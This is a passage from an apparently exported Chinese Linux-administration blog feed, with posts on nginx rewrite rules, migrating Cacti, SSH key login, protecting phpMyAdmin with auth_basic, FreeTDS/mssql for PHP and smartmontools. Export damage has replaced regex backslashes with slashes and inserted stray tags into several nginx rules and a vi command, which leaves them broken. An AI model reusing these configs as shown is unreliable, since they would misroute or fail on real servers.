/opt/lampp/htdocs/www;<br>7.  rewrite ^/ <a href="http://www.c1gstudio.com/" target="_blank" rel="external">http://www.c1gstudio.com/</a>;<br>8.  access_log  off;<br>9.  }<br></div><br><strong>多域名转向</strong><br><div><br><br>1.  server_name  www.c1gstudio.com www.c1gstudio.net;<br>2.  index index.html index.htm index.php;<br>3.  root  /opt/lampp/htdocs;<br>4.  if ($host ~ “c1gstudio/.net”) {<br>5.  rewrite ^(.) <a href="http://www.c1gstudio.com$1" target="_blank" rel="external">http://www.c1gstudio.com$1</a> permanent;<br>6.  }<br></div><br><strong>三级域名跳转</strong><br><div><br><br>1.  if ($http_host ~<em> “^(.</em>)/.i/.c1gstudio/.com$”) {<br>2.  rewrite ^(.<em>) <a href="http://top.yingjiesheng.com$1" target="_blank" rel="external">http://top.yingjiesheng.com$1</a>;<br>3.  break;<br>4.  }<br></em></div><br><strong>域名镜向</strong><br><div><br><br>1.  server<br>2.  {<br>3.  listen       80;<br>4.  server_name  mirror.c1gstudio.com;<br>5.  index index.html index.htm index.php;<br>6.  root  /opt/lampp/htdocs/www;<br>7.  rewrite ^/(.) <a href="http://www.c1gstudio.com/$1" target="_blank" rel="external">http://www.c1gstudio.com/$1</a> last;<br>8.  access_log  off;<br>9.  }<br></div><br><strong>某个子目录作镜向</strong><br><div><br><br>1.  location ^~ /zhaopinhui {<br>2.  rewrite ^.+ <a href="http://zph.c1gstudio.com/" target="_blank" rel="external">http://zph.c1gstudio.com/</a> last;<br>3.  break;<br>4.  }<br></div><br><strong>discuz ucenter home (uchome) rewrite</strong><br><div><br><br>1.  rewrite ^/(space|network)-(.+)/.html$ /$1.php?rewrite=$2 last;<br>2.  rewrite ^/(space|network)/.html$ /$1.php last;<br>3.  rewrite ^/([0-9]+)$ /space.php?uid=$1 last;<br></div><br><strong>discuz 7 rewrite</strong><br><div><br><br>1.  rewrite ^(.<em>)/archiver/((fid|tid)-[/w/-]+/.html)$ $1/archiver/index.php?$2 last;<br>2.  rewrite ^(.</em>)/forum-([0-9]+)-([0-9]+)/.html$ $1/forumdisplay.php?fid=$2&amp;page=$3 last;<br>3.  rewrite ^(.<em>)/thread-([0-9]+)-([0-9]+)-([0-9]+)/.html$ $1/viewthread.php?tid=$2&amp;extra=page/%3D$4&amp;page=$3 last;<br>4.  rewrite ^(.</em>)/profile-(username|uid)-(.+)/.html$ $1/viewpro.php?$2=$3 last;<br>5.  rewrite ^(.<em>)/space-(username|uid)-(.+)/.html$ $1/space.php?$2=$3 last;<br>6.  rewrite ^(.</em>)/tag-(.+)/.html$ $1/tag.php?name=$2 last;<br></div><br><strong>给discuz某版块单独配置域名</strong><br><div><br><br>1.  server_name  bbs.c1gstudio.com news.c1gstudio.com;<br>2.3.  location = / {<br>4.  if ($http_host ~ news/.c1gstudio.com$) {<br>5.  rewrite ^.+ <a href="http://news.c1gstudio.com/forum-831-1.html" target="_blank" rel="external">http://news.c1gstudio.com/forum-831-1.html</a> last;<br>6.  break;<br>7.  }<br>8.  }<br></div><br><strong>discuz ucenter 头像 rewrite 优化</strong><br><div><br><br>1.  location ^~ /ucenter {<br>2.  location ~ .<em>/.php?$<br>3.  {<br>4.  #fastcgi_pass  unix:/tmp/php-cgi.sock;<br>5.  fastcgi_pass  127.0.0.1:9000;<br>6.  fastcgi_index index.php;<br>7.  include fcgi.conf;<br>8.  }<br>9.10.  location /ucenter/data/avatar {<br>11.  log_not_found off;<br>12.  access_log   off;<br>13.  location ~ /(.</em>)_big/.jpg$ {<br>14.  error_page 404 /ucenter/images/noavatar_big.gif;<br>15.  }<br>16.  location ~ /(.<em>)_middle/.jpg$ {<br>17.  error_page 404 /ucenter/images/noavatar_middle.gif;<br>18.  }<br>19.  location ~ /(.</em>)_small/.jpg$ {<br>20.  error_page 404 /ucenter/images/noavatar_small.gif;<br>21.  }<br>22.  expires 300;<br>23.  break;<br>24.  }<br>25.  }<br></div><br><strong>jspace rewrite</strong><br><div><br><br>1.  location ~ .<em>/.php?$<br>2.  {<br>3.  #fastcgi_pass  unix:/tmp/php-cgi.sock;<br>4.  fastcgi_pass  127.0.0.1:9000;<br>5.  fastcgi_index index.php;<br>6.  include fcgi.conf;<br>7.  }<br>8.9.  location ~</em> ^/index.php/<br>10.  {<br>11.  rewrite ^/index.php/(.*) /index.php?$1 break;<br>12.  fastcgi_pass  127.0.0.1:9000;<br>13.  fastcgi_index index.php;<br>14.  include fcgi.conf;<br>15.  }<br></div>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Cacti 监控平台迁移备忘及运行cacti的php相关函数]]></title>
      <url>/2012/11/17/cacti-e7-9b-91-e6-8e-a7-e5-b9-b3-e5-8f-b0-e8-bf-81-e7-a7-bb-e5-a4-87-e5-bf-98-e5-8f-8a-e8-bf-90-e8-a1-8ccacti-e7-9a-84php-e7-9b-b8-e5-85-b3-e5-87-bd-e6-95-b0.html</url>
      <content type="html"><![CDATA[<p>公司用的 Cacti 监控平台已经有些时日了，一直运行很稳定，不过，昨天接到通知要迁移 Cacti 平台到别外的一台新服务器。以初以为直接把 Cacti 的 WEB 文件和数据库同步到新服务器就可以了，在实际操作的过程中发现并不是这样的。</p>
<p>首先配置好新服务器的LNMP环境，并将原来的 Cacti 的WEB文件和 mysql 同步到新的服务器。考虑到服务器的安全因素，我的环境配置脚本默认是把 PHP 的以下函数禁用的：<br><code>disable_functions = system,exec,shell_exec,passthru,popen,dl</code><br>Cacti 在读取数据和画图的时候需要 exec() shell_exec() popen() 等函数，果然没有开启，可能会出现不能出图的情况。</p>
<p>如果新的服务器上的文件目录和之前的不一致，需要在引入 sql 之前编辑修改一下路径。不然有可能出现 Cacti 不能正常调用一些脚本的情况。<br><code>vi cacti.sql
:%s//old/cacti.tcis.me//new/cacti.tcis.me/g</code><br>用vi替换的时候注意一下“/”的转义。</p>
<p>检查一下 Cacti 中的 settings paths 的选项是否和新的服务器上的实际环境一致</p>
<p><a href="http://tcis.me/wp-content/uploads/2011/10/cacti_setting_paths.jpg" target="_blank" rel="external"><img src="http://tcis.me/wp-content/uploads/2011/10/cacti_setting_paths.jpg" alt="" title="cacti_setting_paths"></a></p>
<p>然后把被监控的服务器上的设置改一下，把IP改为新的服务器的<br>`vi /etc/snmp/snmpd.conf</p>
<h1 id="First-map-the-community-name-“public”-into-a-“security-name”"><a href="#First-map-the-community-name-“public”-into-a-“security-name”" class="headerlink" title="First, map the community name “public” into a “security name”"></a>First, map the community name “public” into a “security name”</h1><h1 id="sec-name-source-community"><a href="#sec-name-source-community" class="headerlink" title="sec.name  source          community"></a>sec.name  source          community</h1><p>com2sec notConfigUser  新的cacti监控服务器的IP  public<br>/etc/init.d/snmpd restart`<br>然后向 iptables 添加一条新的记录，让其允许和新的监控服务器通信</p>
<p><code>iptables -I INPUT -s 新的cacti监控服务器的IP -p udp --dport 161 -j ACCEPT</code></p>
<p>最后不要忘记在 crontab 中加定期执行 poller.php<br><code>crontab -e
*/5 * * * * php /new/cacti.tcis.me/poller.php &amp;gt; /dev/null 2&amp;gt;&amp;amp;1</code><br>这个时候，新的 Cacti 监控就应该可以正常工作了。</p>
<p>如果你之前安装有监控 Nginx  的脚本，不要忘记让 perl 支持 LWP::UserAgent ，否则 Nginx 的监控部分会出不来图。</p>
<p>测试是否已经开启支持：<br><code>/new/cacti.tcis.me/get_nginx_clients_status.pl [http://tcis.me/nginx_status](http://tcis.me/nginx_status)</code><br>如提示 no (LWP::UserAgent not found) 就说明了 perl 的确是缺少该组件</p>
<p>两种方法安装支持，第一种编译花的时间比较长，建议使用第二种：<br>`#方法一：</p>
<p>#perl -MCPAN -e shell 一直回车，知道出现cpan&gt;  提示符开始。<br>cpan&gt; install LWP::UserAgent7……………………………………<br>……………………………………<br>cpan&gt; exit</p>
<p>#方法二：（用时比较短）<br>yum installperl-libwww-perl`</p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[采用密钥方式认证登录linux系统]]></title>
      <url>/2012/11/09/e9-87-87-e7-94-a8-e5-af-86-e9-92-a5-e6-96-b9-e5-bc-8f-e8-ae-a4-e8-af-81-e7-99-bb-e5-bd-95linux-e7-b3-bb-e7-bb-9f.html</url>
      <content type="html"><![CDATA[<p>由于使用密码方式认证，每天会有大量的尝试爆破攻击，很是厌烦！现在改用通过创建密钥对的方式认证；SSH优点是基于成熟的公钥加密体系，所以传输的数据会进行加密，保证数据在传输的时候，不被篡改及泄露，从而提高了系统的安全性。</p>
<p>一般的linux操作系统中都有默认安装，或者安装时选择安装。</p>
<p>#rpm –qa |grep ssh 可用此命令查看安装了那个版本</p>
<p><img src="http://img1.51cto.com/attachment/201211/164139835.png" alt=""></p>
<p>输入ps –ef|grep ssh 如果只有看到ssh-agent，那么说明ssh-server还没有启动，需要如下命令来启动#/etc/init.d/ssh start</p>
<p>&nbsp;</p>
<p>配置文件：/etc/ssh/sshd_config</p>
<p><strong>修改禁止root用户直接登录</strong><br>将PermitRootLoginPermitRootLogin参数”yes”修改为”no”</p>
<p><strong>设置基于密钥登录方式</strong><br>将#AuthorizedKeysFile .ssh/authorized_keys的#注释去掉，用于设置用户公钥文件存储位置，系统默认位置在用户目录下的.ssh/authorized_keys(其实就是生成的公钥文件)</p>
<p><strong>取消密码验证方式</strong></p>
<p>#PasswordAuthentication yes 的#去掉，并将”yes”改成”no”</p>
<p>&nbsp;</p>
<p>SSH登录方式有密码登录和密钥登录，这里详细介绍一下密钥登录。</p>
<p>服务器每天有不计其数针对SSH的密码猜解，虽然加了密码错误三次后禁止IP的denyhosts模块设置，但是实际应用仍然不是很完美，索性将服务器认证方式换成密钥认证了，就是不能再用密码登录，除非有密钥。</p>
<p>这里说两种密钥生成的方法，一种是命令行生成，一种是用工具来生成（如securecrt）</p>
<p>1 命令行生成<br>假设我们为root用户生成KEY，在root下执行下面的命令：</p>
<h1 id="ssh-keygen-t-rsa"><a href="#ssh-keygen-t-rsa" class="headerlink" title="ssh-keygen -t rsa"></a>ssh-keygen -t rsa</h1><p>Generating public/private rsa key pair.</p>
<p>Enter file in which to save the key (/root/.ssh/id_rsa): //密钥保存的路径</p>
<p>Created directory ‘/root/.ssh’. //注意:.ssh目录为隐藏目录</p>
<p>Enter passphrase (empty for no passphrase): //输入密钥密码,可不设置，设了就是密钥加密码的登录方式</p>
<p>Enter same passphrase again:</p>
<p>Your identification has been saved in /home/forever/.ssh/id_rsa. //私钥密码保存径</p>
<p>Your public key has been saved in /home/forever/.ssh/id_rsa.pub. //公钥密码保存路径</p>
<p>The key fingerprint is:</p>
<p>f1:80:a6:95:5d:43:1b:96:21:e2:f1:8c:7b:ca:95:e8 forever@bjf 密码指纹</p>
<p>设置后在/root/.ssh/下会生成一个公钥文件跟一个私钥文件</p>
<p>2 secureCRT生成</p>
<p><img src="http://img1.51cto.com/attachment/201211/165300377.png" alt=""></p>
<p>选择RSA密钥类型</p>
<p><img src="http://img1.51cto.com/attachment/201211/164210411.png" alt=""></p>
<p>通行短语即密钥密钥，可不填，注释就是备注下你是谁</p>
<p><img src="http://img1.51cto.com/attachment/201211/164217974.png" alt=""></p>
<p>选择OpenSSH密钥格式，点击完成即可生成私钥公钥文件</p>
<p><img src="http://img1.51cto.com/attachment/201211/164225842.png" alt=""></p>
<p>密钥生成后，需在服务端与客户端做设置</p>
<p>服务端：</p>
<p>把公钥文件的内容复制到/root/.ssh/authorized_keys</p>
<p>或重命名mv id.rsa.pub authorized_keys都行</p>
<p>客户端：</p>
<p>然后把私有密钥文件下载到本机，用secureCRT连接会话，选择密钥登录，并选择其私有密钥文件，用root用户即可登录，若设置了密钥密码，就还需要输入密码才能登录。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[ssh密钥认证原理]]></title>
      <url>/2012/11/09/ssh-e5-af-86-e9-92-a5-e8-ae-a4-e8-af-81-e5-8e-9f-e7-90-86.html</url>
      <content type="html"><![CDATA[<p>所谓的密钥认证，实际上是使用一对加密字符串，一个称为公钥(public key)， 任何人都可以看到其内容，用于加密；另一个称为密钥(private key)，只有拥有者才能看到，用于解密。 通过公钥加密过的密文使用密钥可以轻松解密，但根据公钥来猜测密钥却十分困难。</p>
<p>ssh 的密钥认证就是使用了这一特性。服务器和客户端都各自拥有自己的公钥和密钥。 为了说明方便，以下将使用这些符号。<br>Ac 客户端公钥<br>Bc 客户端密钥<br>As 服务器公钥<br>Bs 服务器密钥</p>
<p>在认证之前，客户端需要通过某种方法将公钥 Ac 登录到服务器上。</p>
<p>认证过程分为两个步骤。</p>
<p>1. 会话密 钥(session key)生成<br>1. 客户端 请求连接服务器，服务器将 As 发送给客户端。<br>2. 服务器生成会话ID(session id)，设为 p，发送给客户端。<br>3. 客户端生成会话密钥(session key)，设为 q，并计算 r = p xor q。<br>4. 客户端将 r 用 As 进行加密，结果发送给服务器。<br>5. 服务器用 Bs 进行解密，获得 r。<br>6. 服务器进行 r xor p 的运算，获得 q。<br>7. 至此服务器和客户端都知道了会话密钥q，以后的传输都将被 q 加密。<br>2. 认证<br>1. 服务器 生成随机数 x，并用 Ac 加密后生成结果 S(x)，发送给客户端<br>2. 客户端使用 Bc 解密 S(x) 得到 x<br>3. 客户端计算 q + x 的 md5 值 n(q+x)，q为上一步得到的会话密钥<br>4. 服务器计算 q + x 的 md5 值 m(q+x)<br>5. 客户端将 n(q+x) 发送给服务器<br>6. 服务器比较 m(q+x) 和 n(q+x)，两者相同则认证成功</p>
<div></div><br><div></div><br><div></div><br><div></div><br><div><br><div><br><div></div><br></div><br></div>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Nginx auth_basic+phpMyAdmin安全验证（转载）]]></title>
      <url>/2012/10/21/nginx-auth-basicphpmyadmin-e5-ae-89-e5-85-a8-e9-aa-8c-e8-af-81-ef-bc-88-e8-bd-ac-e8-bd-bd-ef-bc-89.html</url>
      <content type="html"><![CDATA[<p>phpMyAdmin 是一个以 PHP 为基础，以 Web-Base 方式架构在网站主机上的 MySQL 的数据库管理工具，让管理者可用 Web 接口管理 MySQL 数据库。</p>
<p>通过 Nginx <strong>auth_basic</strong> 验证功能，可以为 phpMyAdmin 目录增加用户名，密码验证机制。防止任意用户访问 phpMyAdmin（0day 我怕怕！）。</p>
<p><a href="http://www.reistlin.com/attachment/307/" title="nginx_auth.gif" target="_blank" rel="external"><img src="http://www.reistlin.com/usr/uploads/2011/05/2614014944.gif" alt="nginx_auth.gif"></a></p>
<p>&nbsp;</p>
<h3 id="一，使用-htpasswd-命令生成密码文件，支持语法如下："><a href="#一，使用-htpasswd-命令生成密码文件，支持语法如下：" class="headerlink" title="一，使用 htpasswd 命令生成密码文件，支持语法如下："></a><strong>一，使用 htpasswd 命令生成密码文件，支持语法如下：</strong></h3><pre>/usr/bin/htpasswd -c passwordfile username</pre>

<h3 id="二，举例：生成一个-reistlin-passwd-密码文件，用户名-admin，密码"><a href="#二，举例：生成一个-reistlin-passwd-密码文件，用户名-admin，密码" class="headerlink" title="二，举例：生成一个 reistlin.passwd 密码文件，用户名 admin，密码 *"></a><strong>二，举例：生成一个 reistlin.passwd 密码文件，用户名 admin，密码 <em>*</em></strong></h3><pre>/usr/bin/htpasswd -c /etc/nginx/conf/reistlin.passwd admin

New password: ***
Re-type new password: ***

Adding password for user admin

# 注意，密码文件访问权限
chmod 600 reistlin.passwd</pre>

<h3 id="三，编辑-nginx-conf，配置-auth-basic，配置-reistlin-passwd-密码文件路径，配置访问策略和请求限制"><a href="#三，编辑-nginx-conf，配置-auth-basic，配置-reistlin-passwd-密码文件路径，配置访问策略和请求限制" class="headerlink" title="三，编辑 nginx.conf，配置 auth_basic，配置 reistlin.passwd 密码文件路径，配置访问策略和请求限制"></a><strong>三，编辑 nginx.conf，配置 auth_basic，配置 reistlin.passwd 密码文件路径，配置访问策略和请求限制</strong></h3><p><strong>配置说明：</strong></p>
<p>1，需要在 <strong>http {}</strong> 中启用 HttpLimitReqModule，定义一个 zone（admin），session state 设置为 1M（仅用于 auth_basic 安全验证），每分钟 3 次（20 秒一次），“来源 IP 地址”为判断条件。</p>
<p>2，需要在 <strong>location {}</strong> 中定义 auth_basic 安全验证提示信息，指定密码文件路径。启用 admin zone，设置安全验证请求限制（每分钟 20 次，每次最多接受 3 个请求，超过的请求将被 503 Service Unavailable）。</p>
<pre># http
limit_req_zone  $binary_remote_addr  zone=admin:1m  rate=3r/m;

# location
location /phpMyAdmin/ {
        root   /home/reistlin/htdocs;
        index  index.html  index.htm  index.php;
        auth_basic  "Administrator Login";
        auth_basic_user_file  /etc/nginx/conf/reistlin.passwd;

        limit_req  zone=admin  burst=3;
}</pre>

<h3 id="四，验证配置文件，Reload-Nginx-配置"><a href="#四，验证配置文件，Reload-Nginx-配置" class="headerlink" title="四，验证配置文件，Reload Nginx 配置"></a><strong>四，验证配置文件，Reload Nginx 配置</strong></h3><pre>/etc/nginx/sbin/nginx -t

the configuration file /etc/nginx/conf/nginx.conf syntax is ok
configuration file /etc/nginx/conf/nginx.conf test is successful

kill -HUP `cat /etc/nginx/logs/nginx.pid`</pre>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[wubi使用ubuntu-12.04-wubi-amd64.tar.xz安装64位ubuntu]]></title>
      <url>/2012/10/21/wubi-e4-bd-bf-e7-94-a8ubuntu-12-04-wubi-amd64-tar-xz-e5-ae-89-e8-a3-8564-e4-bd-8dubuntu.html</url>
      <content type="html"><![CDATA[<p>安装64位Ubuntu，方法其实解决方案很简单，不用下载任何的ISO，只要去下载最新的64位包，见下面资源。<br>拷贝wubi.exe和下载好的ubuntu-12.10-wubi-amd64.tar.xz都拷贝到C盘<strong>根目录</strong>下，然后执行下面命令即可。</p>
<div>    cd c:</div><br><div>    wubi.exe –dimagepath=c:ubuntu-12.10-wubi-amd64.tar.xz</div><br><div></div><br><div>ubuntu下载地址:</div><br><div><a href="http://mirrors.163.com/ubuntu-releases/" target="_blank" rel="external">http://mirrors.163.com/ubuntu-releases/</a></div>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[linux下配置连接mssql环境]]></title>
      <url>/2012/10/19/linux-e4-b8-8b-e9-85-8d-e7-bd-ae-e8-bf-9e-e6-8e-a5mssql-e7-8e-af-e5-a2-83.html</url>
      <content type="html"><![CDATA[<p>这里我们采用freeTDS程序库，实现linux下访问微软SQL SERVER数据库，php通过mssql.so库文件实现连接mssql</p>
<p><strong>操作步骤如下：</strong></p>
<p><strong>       1.下载freeTDS </strong></p>
<p><a href="http://www.ibiblio.org/pub/Linux/ALPHA/freetds/old/0.63/freetds-0.63.tar.gz" target="_blank" rel="external">http://www.ibiblio.org/pub/Linux/ALPHA/freetds/old/0.63/freetds-0.63.tar.gz</a></p>
<p>tar xf freetds-0.63.tar.gz</p>
<p>./configure –prefix= –with-tdsver=8.0 –enable-msdblib –enable-dbmfix –with-gnu-ld</p>
<p>–enable-shared –enable-static</p>
<p>make &amp;&amp; make install</p>
<p>(-prefix为设置FreeTDS的安装目录，–with-tdsver是设置TDS版本，–enable-msdblib为是否允许Microsoft数据库函数库)</p>
<p><span style="color: #ff0000;">       vim  /etc/profile</span></p>
<p><span style="color: #ff0000;">        中加入export PATH=”$PATH:/usr/local/freetds/bin”</span></p>
<p><span style="color: #ff0000;">        source /etc/profile  是修改的系统变量生效</span></p>
<p><strong> 2.将freetds库加入系统库缓存</strong></p>
<p>echo “/usr/local/freetds/lib”&gt;&gt;/etc/ld.so.conf</p>
<p>ldconfig命令使其生效</p>
<p><strong> 3、配置freetds（可省）</strong></p>
<p>[root@ ~]# cat /usr/local/freetds/etc/freetds.conf</p>
<p>[global]</p>
<h1 id="TDS-protocol-version"><a href="#TDS-protocol-version" class="headerlink" title="TDS protocol version"></a>TDS protocol version</h1><p>;       tds version = 4.2</p>
<h1 id="Whether-to-write-a-TDSDUMP-file-for-diagnostic-purposes"><a href="#Whether-to-write-a-TDSDUMP-file-for-diagnostic-purposes" class="headerlink" title="Whether to write a TDSDUMP file for diagnostic purposes"></a>Whether to write a TDSDUMP file for diagnostic purposes</h1><h1 id="setting-this-to-tmp-is-insecure-on-a-multi-user-system"><a href="#setting-this-to-tmp-is-insecure-on-a-multi-user-system" class="headerlink" title="(setting this to /tmp is insecure on a multi-user system)"></a>(setting this to /tmp is insecure on a multi-user system)</h1><p>;       dump file = /tmp/freetds.log<br>;       debug flags = 0xffff</p>
<h1 id="Command-and-connection-timeouts"><a href="#Command-and-connection-timeouts" class="headerlink" title="Command and connection timeouts"></a>Command and connection timeouts</h1><p>;       timeout = 10<br>;       connect timeout = 10</p>
<h1 id="If-you-get-out-of-memory-errors-it-may-mean-that-your-client"><a href="#If-you-get-out-of-memory-errors-it-may-mean-that-your-client" class="headerlink" title="If you get out-of-memory errors, it may mean that your client"></a>If you get out-of-memory errors, it may mean that your client</h1><h1 id="is-trying-to-allocate-a-huge-buffer-for-a-TEXT-field"><a href="#is-trying-to-allocate-a-huge-buffer-for-a-TEXT-field" class="headerlink" title="is trying to allocate a huge buffer for a TEXT field."></a>is trying to allocate a huge buffer for a TEXT field.</h1><h1 id="Try-setting-‘text-size’-to-a-more-reasonable-limit"><a href="#Try-setting-‘text-size’-to-a-more-reasonable-limit" class="headerlink" title="Try setting ‘text size’ to a more reasonable limit"></a>Try setting ‘text size’ to a more reasonable limit</h1><p>text size = 64512<br>host = xxx.xxx.xxx.xxx(mssql地址)</p>
<p>port = 1433<br>tds version = 8.0<br>client charset = UTF-8</p>
<p><strong>4.增加mssql扩展</strong></p>
<p>cd  /usr/src/lnmp/php-5.3.10/ext/mssql</p>
<p>/usr/local/bin/phpize</p>
<p>./configure  –with-php-config=/usr/local/bin/php-config  –with-mssql=/usr/local/freetds</p>
<p>make &amp;&amp; make install</p>
<p>ls  /usr/local/php/lib/php/extensions/no-debug-non-zts-20090626/mssql.so</p>
<p>vim /usr/local/php/etc/php.ini</p>
<p>添加<span style="color: #ff0000;">extension=mssql.so</span></p>
<p><strong>      测试：</strong></p>
<blockquote>
<p>&lt;?php<br>$ms = mssql_connect(‘192.168.1.111,9201’,’usernanme’,’passwd’,false);<br>var_dump($ms);<br>?&gt;</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mssql扩展 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux下硬盘健康的检测smartmontools]]></title>
      <url>/2012/10/12/linux-e4-b8-8b-e7-a1-ac-e7-9b-98-e5-81-a5-e5-ba-b7-e7-9a-84-e6-a3-80-e6-b5-8bsmartmontools.html</url>
      <content type="html"><![CDATA[<p>1.1 什么是Smartmontools？</p>
<p>Smartmontools是一种硬盘检测工具，通过控制和管理硬盘的SMART（Self Monitoring Analysis and Reporting Technology，自动检测分析及报告技术）技术来实现的，SMART技术可以对硬盘的磁头单元、盘片电机驱动系统、硬盘内部电路以及盘片表面介质材 料等进行监测，当SMART监测并分析出硬盘可能出现问题时会及时向用户报警以避免计算机数据受损失。SMART技术必须在主板支持的前提下才能发生作 用，而且 SMART技术也不能保证能预报所有可能发生的硬盘故障。SMART(SFF-8035i) 是硬盘生产商们建立的一个工业标准，这个标准就是在硬盘上保存一个跟执行情况，可靠程度，读找错误率等属性的表格。所有属性都有一个1byte(大小范围 1-253)的标准化值，还包含另一个1byte的关键阶段值，如果属性表格内某个数据接近小于或达到关键阶段值，表明硬盘工作不正常了。</p>
<p>下载地址：source:<a href="http://www.turbolinux.com.cn/turbo/wiki/doku.php?do=export_xhtml&amp;id=%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86:smartmontools" target="_blank" rel="external">http://www.turbolinux.com.cn/turbo/wiki/doku.php?do=export_xhtml&amp;id=%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86:smartmontools</a></p>
<p>2.1 Smartmontools的使用</p>
<p>1、启动监控进程</p>
<h1 id="etc-init-d-smartd-start"><a href="#etc-init-d-smartd-start" class="headerlink" title="/etc/init.d/smartd start"></a>/etc/init.d/smartd start</h1><p>启动 smartd： [ 确定 ]</p>
<p>2、检查硬盘是否支持SMART 1993年以后出厂的硬盘基本上都支持SMART技术，使用如下命令可以来查看：</p>
<h1 id="smartctl-i-dev-hdb"><a href="#smartctl-i-dev-hdb" class="headerlink" title="smartctl -i /dev/hdb"></a>smartctl -i /dev/hdb</h1><p>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF INFORMATION SECTION ===<br>Device Model: ST3160212A<br>Serial Number: 5LS2EDKN<br>Firmware Version: 3.AAE<br>User Capacity: 160,041,885,696 bytes<br>Device is: Not in smartctl database [for details use: -P showall]<br>ATA Version is: 7<br>ATA Standard is: Exact ATA specification draft version not indicated<br>Local Time is: Mon Sep 17 02:13:37 2007 CST<br>SMART support is: Available - device has SMART capability.<br>SMART support is: Enabled</p>
<p>在上面的信息可以看到，该硬盘是支持SMART技术，且当前是开启的。如果SMART support is: Disabled表示SMART未启用，执行如下命令，启动SMART：</p>
<p>smartctl –smart=on –offlineauto=on –saveauto=on /dev/hdb</p>
<p>3、检查硬盘健康状态</p>
<h1 id="smartctl-H-dev-hdb"><a href="#smartctl-H-dev-hdb" class="headerlink" title="smartctl -H /dev/hdb"></a>smartctl -H /dev/hdb</h1><p>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF READ SMART DATA SECTION ===<br>SMART overall-health self-assessment test result: PASSED</p>
<p>请注意result后边的结果：PASSED，这表示硬盘健康状态良好，如果这里显示Failure，那么最好立刻给服务器更换硬盘。SMART只 能报告磁盘已经不再健康，但是报警后还能继续运行多久是不确定的，通常，SMART报警参数是有预留的，磁盘报警后，不会当场坏掉，一般能坚持一段时间， 有的硬盘SMART报警后还继续跑了好几年，有的硬盘SMART报错后几天就坏了，千万不要存在侥幸心理。执行如下命令可以看到详细的参数：</p>
<h1 id="smartctl-A-dev-hdb"><a href="#smartctl-A-dev-hdb" class="headerlink" title="smartctl -A /dev/hdb"></a>smartctl -A /dev/hdb</h1><p>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF READ SMART DATA SECTION ===<br>SMART Attributes Data Structure revision number: 10<br>Vendor Specific SMART Attributes with Thresholds:<br>ID# ATTRIBUTE_NAME FLAG VALUE WORST THRESH TYPE UPDATED WHEN_FAILED RAW_VALUE<br>1 Raw_Read_Error_Rate 0x000f 114 100 006 Pre-fail Always - 81812244<br>3 Spin_Up_Time 0x0003 100 099 000 Pre-fail Always - 0<br>4 Start_Stop_Count 0x0032 100 100 020 Old_age Always - 257<br>5 Reallocated_Sector_Ct 0x0033 100 100 036 Pre-fail Always - 0<br>7 Seek_Error_Rate 0x000f 078 060 030 Pre-fail Always - 64781708<br>9 Power_On_Hours 0x0032 096 096 000 Old_age Always - 4365<br>10 Spin_Retry_Count 0x0013 100 100 097 Pre-fail Always - 0<br>12 Power_Cycle_Count 0x0032 100 100 020 Old_age Always - 276<br>187 Unknown_Attribute 0x0032 100 100 000 Old_age Always - 0<br>189 Unknown_Attribute 0x003a 100 100 000 Old_age Always - 0<br>190 Unknown_Attribute 0x0022 058 053 045 Old_age Always - 773324842<br>194 Temperature_Celsius 0x0022 042 047 000 Old_age Always - 42 (Lifetime Min/Max 0/21)<br>195 Hardware_ECC_Recovered 0x001a 052 048 000 Old_age Always - 1562815<br>197 Current_Pending_Sector 0x0012 100 100 000 Old_age Always - 0<br>198 Offline_Uncorrectable 0x0010 100 100 000 Old_age Offline - 0<br>199 UDMA_CRC_Error_Count 0x003e 200 200 000 Old_age Always - 0<br>200 Multi_Zone_Error_Rate 0x0000 100 253 000 Old_age Offline - 0<br>202 TA_Increase_Count 0x0032 100 253 000 Old_age Always - 0</p>
<p>FLAG是标记，标准数值(VALUE)应当小于或等於关键值(THRESH)。WHEN_FAILED 代表错误信息，上面显示的WHEN_FAILED纵行是空行，说明硬盘没有故障。如果WHEN_FAILED显示数字，表明硬盘磁道可能有比较大的坏道。</p>
<p>4、对硬盘进行检测 手工对硬盘进行测试的方法有以下四种：</p>
<p>smartctl -t short &lt;device&gt; 后台检测硬盘，消耗时间短<br>smartctl -t long &lt;device&gt; 后台检测硬盘，消耗时间长<br>smartctl -C -t short &lt;device&gt; 前台检测硬盘，消耗时间短<br>smartctl -C -t long &lt;device&gt; 前台检测硬盘，消耗时间长</p>
<p>例如，在后台对硬盘进行详细的检查，命令如下：</p>
<h1 id="smartctl-t-long-dev-hdb"><a href="#smartctl-t-long-dev-hdb" class="headerlink" title="smartctl -t long /dev/hdb"></a>smartctl -t long /dev/hdb</h1><p>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
